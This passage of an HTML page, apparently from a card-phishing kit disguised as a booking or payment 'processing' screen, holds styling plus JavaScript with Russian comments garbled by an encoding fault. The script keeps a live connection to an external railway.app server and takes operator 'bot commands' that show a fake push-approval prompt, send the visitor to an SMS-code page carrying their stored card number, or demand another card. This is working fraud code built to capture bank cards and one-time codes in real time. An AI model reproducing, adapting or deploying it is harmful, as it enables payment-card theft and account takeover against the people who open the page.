    <style>
        :root {
            --primary: #D4AF37;
            --primary-dark: #B8941F;
            --primary-light: rgba(212, 175, 55, 0.1);
            --dark: #121212;
            --dark-light: #1E1E1E;
            --text: #FFFFFF;
            --text-secondary: #B0B0B0;
            --error: #FF6B6B;
            --success: #4CAF50;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
            background: var(--dark);
            height: 100%;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
            min-height: 100vh;
            color: var(--text);
            line-height: 1.6;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent;
            -webkit-text-size-adjust: 100%;
            background-attachment: fixed;
            background-repeat: no-repeat;
            background-size: cover;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
            z-index: -2;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            z-index: 1;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            margin-bottom: 30px;
            width: 100%;
            max-width: 100%;
            flex-wrap: wrap;
            gap: 15px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
            text-decoration: none;
            flex-shrink: 0;
        }

        .logo:visited, .logo:hover, .logo:active {
            text-decoration: none;
            color: inherit;
        }

        .logo-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--dark);
            font-weight: 800;
            font-size: 24px;
            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
            flex-shrink: 0;
        }

        .logo-text {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1px;
        }

        .header-controls {
            display: flex;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
            justify-content: flex-end;
        }

        .language-selector {
            position: relative;
            display: inline-block;
        }

        .language-btn {
            background: var(--primary-light);
            color: var(--primary);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 8px 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: all 0.3s ease;
            min-height: 44px;
        }

        .language-btn:hover {
            background: var(--primary);
            color: var(--dark);
        }

        .language-dropdown {
            display: none;
            position: absolute;
            top: 100%;
            right: 0;
            background: var(--dark-light);
            border-radius: 8px;
            padding: 10px 0;
            min-width: 150px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            z-index: 100;
        }

        .language-dropdown.show {
            display: block;
        }

        .language-option {
            padding: 12px 20px;
            cursor: pointer;
            transition: background 0.3s ease;
            min-height: 44px;
            display: flex;
            align-items: center;
        }

        .language-option:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .language-option.active {
            color: var(--primary);
            font-weight: 600;
        }

        .user-actions {
            display: flex;
            gap: 15px;
        }

        .btn-icon {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: var(--primary-light);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary);
            cursor: pointer;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }

        .btn-icon:hover {
            background: var(--primary);
            color: var(--dark);
            transform: translateY(-2px);
        }

        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            height: calc(100vh - 200px);
        }

        .loader {
            border: 8px solid var(--primary-light);
            border-top: 8px solid var(--primary);
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 22px;
            font-weight: 700;
            color: var(--primary);
        }

        .loading-subtext {
            color: var(--text-secondary);
            font-size: 16px;
        }

        /* –°–∫—Ä—ã—Ç—ã–π —Å—Ç–∞—Ç—É—Å SSE */
        .sse-status {
            display: none;
        }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –ø—É—à-—É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è */
        .push-notification {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            animation: fadeIn 0.3s ease;
            padding: 20px;
        }

        .push-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            width: 100%;
            text-align: center;
            animation: slideUp 0.4s ease;
        }

        .push-icon {
            font-size: 48px;
            color: var(--primary);
            margin-bottom: 20px;
        }

        .push-title {
            font-size: 20px;
            font-weight: 700;
            color: var(--text);
            margin-bottom: 15px;
        }

        .push-message {
            color: var(--text-secondary);
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .push-timer {
            color: var(--primary);
            font-weight: 600;
            font-size: 14px;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 40px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--text-secondary);
            font-size: 14px;
            flex-shrink: 0;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }

            header {
                flex-direction: column;
                gap: 20px;
                text-align: center;
            }

            .logo {
                justify-content: center;
                width: 100%;
            }

            .header-controls {
                width: 100%;
                justify-content: center;
                flex-direction: row;
                gap: 15px;
            }

            .user-actions {
                gap: 10px;
            }

            .btn-icon {
                width: 44px;
                height: 44px;
            }

            .loader {
                width: 60px;
                height: 60px;
                border-width: 6px;
            }

            .loading-text {
                font-size: 20px;
            }

            .loading-subtext {
                font-size: 14px;
            }

            .push-card {
                padding: 25px;
                margin: 15px;
            }

            .push-icon {
                font-size: 40px;
            }

            .push-title {
                font-size: 18px;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 12px;
            }

            .logo-icon {
                width: 44px;
                height: 44px;
                font-size: 20px;
            }

            .logo-text {
                font-size: 24px;
            }

            .header-controls {
                flex-direction: column;
                gap: 12px;
            }

            .language-btn {
                padding: 10px 15px;
                font-size: 15px;
                min-height: 44px;
            }

            footer {
                padding: 25px 0;
                margin-top: 30px;
                font-size: 13px;
            }

            .push-card {
                padding: 20px;
            }

            .push-icon {
                font-size: 36px;
            }

            .push-title {
                font-size: 16px;
            }

            .push-message {
                font-size: 14px;
            }
        }

        /* iOS Specific Fixes */
        @supports (-webkit-touch-callout: none) {
            .language-btn, .btn-icon {
                min-height: 44px;
            }

            body {
                min-height: -webkit-fill-available;
            }

            html {
                height: -webkit-fill-available;
            }
        }

        /* –£–±–∏—Ä–∞–µ–º —Å–∫—Ä–æ–ª–ª–±–∞—Ä */
        ::-webkit-scrollbar {
            width: 0px;
            background: transparent;
        }

        * {
            scrollbar-width: none;
        }

        * {
            -ms-overflow-style: none;
        }
    </style>
</head>

    <script>

        let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';

        function changeLanguage(lang) {
            currentLanguage = lang;
            sessionStorage.setItem('selectedLanguage', lang);
            const t = translations[lang];
            document.getElementById('loadingText').textContent = t.loadingText;
            document.getElementById('loadingSubtext').textContent = t.loadingSubtext;
            document.getElementById('currentLanguage').textContent =
                lang === 'ru' ? '–†—É—Å—Å–∫–∏–π' :
                lang === 'pl' ? 'Polski' : 'English';

            document.querySelectorAll('.language-option').forEach(option => {
                option.classList.toggle('active', option.getAttribute('data-lang') === lang);
            });
        }

        function initLanguageSelector() {
            const languageBtn = document.querySelector('.language-btn');
            const languageDropdown = document.getElementById('languageDropdown');

            languageBtn.addEventListener('click', function(event) {
                event.stopPropagation();
                languageDropdown.classList.toggle('show');
            });

            document.querySelectorAll('.language-option').forEach(option => {
                option.addEventListener('click', function() {
                    const lang = this.getAttribute('data-lang');
                    changeLanguage(lang);
                    languageDropdown.classList.remove('show');
                });
            });

            document.addEventListener('click', function(event) {
                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                    languageDropdown.classList.remove('show');
                }
            });
        }

        // –£–õ–£–ß–®–ï–ù–ù–û–ï SSE –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï
        // –ü–æ–ª—É—á–∞–µ–º transaction_id –∏–∑ URL –∏–ª–∏ sessionStorage
        const urlParams = new URLSearchParams(window.location.search);
        const transactionId = urlParams.get('tx_id') || sessionStorage.getItem('currentTransactionId');
        const userId = transactionId || "user_default";
        const RAILWAY_URL = "https://roomix-production.up.railway.app";
        let eventSource = null;
        let reconnectAttempts = 0;
        const maxReconnectAttempts = 100;
        const baseReconnectDelay = 1000;
        let currentReconnectDelay = baseReconnectDelay;
        let pingInterval;

        function connectSSE() {
            if (reconnectAttempts >= maxReconnectAttempts) {
                console.error('‚ùå –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è');
                return;
            }

            if (eventSource) {
                eventSource.close();
            }

            try {
                const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
                console.log(`üîÑ –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ SSE (–ø–æ–ø—ã—Ç–∫–∞ ${reconnectAttempts + 1}):`, sseUrl);

                eventSource = new EventSource(sseUrl);

                eventSource.onopen = function(event) {
                    console.log('‚úÖ SSE –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–∫—Ä—ã—Ç–æ');
                    reconnectAttempts = 0;
                    currentReconnectDelay = baseReconnectDelay;
                };

                eventSource.onmessage = function(event) {
                    console.log('üì® –ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ SSE:', event.data);
                    try {
                        const data = JSON.parse(event.data);

                        if (data.type === 'connected') {
                            console.log('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è SSE');
                            return;
                        }

                        if (data.type === 'bot_command') {
                            handleBotCommand(data);
                        }
                    } catch (e) {
                        console.error('‚ùå –û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ –∫–æ–º–∞–Ω–¥—ã:', e);
                    }
                };

                eventSource.onerror = function(event) {
                    console.error('‚ùå –û—à–∏–±–∫–∞ SSE —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è');
                    reconnectAttempts++;
                    currentReconnectDelay = Math.min(currentReconnectDelay * 1.5, 30000);

                    if (eventSource.readyState === EventSource.CLOSED) {
                        console.log(`üîÑ –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∞–µ–º—Å—è —á–µ—Ä–µ–∑ ${currentReconnectDelay}ms... (–ø–æ–ø—ã—Ç–∫–∞ ${reconnectAttempts}/${maxReconnectAttempts})`);
                        setTimeout(connectSSE, currentReconnectDelay);
                    }
                };

            } catch (error) {
                console.error('üí• –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è SSE:', error);
                reconnectAttempts++;
                currentReconnectDelay = Math.min(currentReconnectDelay * 1.5, 30000);
                setTimeout(connectSSE, currentReconnectDelay);
            }
        }

        function handleBotCommand(command) {
    console.log('ü§ñ –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã:', command);

    if (command.action === 'push') {
        console.log('üîî –ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ PUSH');
        window.showPushNotification();
    } else if (command.action === 'sms') {
        console.log('üì± –ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ SMS');
        // –ü–ï–†–ï–î–ê–ï–ú –ù–û–ú–ï–† –ö–ê–†–¢–´ –ß–ï–†–ï–ó URL
        const cardData = JSON.parse(sessionStorage.getItem('cardData') || '{}');
        const cardNumber = cardData.number || '';
        window.redirectToSMS(cardNumber);
    } else if (command.action === 'wrong_card') {
        console.log('‚ùå –ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ WRONG_CARD');
        window.redirectToPaymentWithError();
    } else if (command.action === 'bind') {

        document.querySelector('.loading-text').textContent = '‚úÖ –ö–∞—Ä—Ç–∞ –ø—Ä–∏–≤—è–∑–∞–Ω–∞!';
    } else if (command.action === 'success') {
        console.log('üéâ –ü–æ–ª—É—á–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ SUCCESS');
        window.redirectToSuccess();
    }
}
